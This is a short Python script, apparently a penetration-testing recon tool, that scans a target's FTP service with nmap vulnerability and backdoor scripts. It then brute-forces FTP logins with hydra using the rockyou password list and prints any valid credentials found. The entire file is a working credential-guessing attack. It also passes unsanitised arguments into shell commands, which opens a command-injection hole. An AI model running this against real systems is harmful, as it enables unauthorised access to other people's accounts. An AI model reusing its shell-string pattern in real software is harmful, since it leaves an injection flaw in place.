#!/usr/bin/env python
import subprocess
import sys
import os

def main(args):
    if len(args) != 3:
        print("Usage: ftprecon.py <ip address> <port>")
        sys.exit(0)

    ip_address = args[1].strip()
    port = args[2].strip()
    print("INFO: Performing nmap FTP script scan for " + ip_address + ":" + port)
    FTPSCAN = "nmap -sV -Pn -vv -p %s --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oN 'discovery/ftp/%s_ftp.nmap' %s" % (port, ip_address, ip_address)
    results = subprocess.check_output(FTPSCAN, shell=True)
    outfile = "discovery/ftp/" + ip_address + "_ftprecon.txt"
    f = open(outfile, "w")
    f.write(results)
    f.close

    print("INFO: Performing hydra ftp scan against " + ip_address )
    HYDRA = "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /root/wordlists/rockyou.txt -f -o discovery/ftp/%s_ftphydra.txt -u %s -s %s ftp" % (ip_address, ip_address, port)
    results = subprocess.check_output(HYDRA, shell=True)
    resultarr = results.split("\n")
    for result in resultarr:
        if "login:" in result:
            print("[*] Valid ftp credentials found: " + result )

if __name__=='__main__':
    main(sys.argv)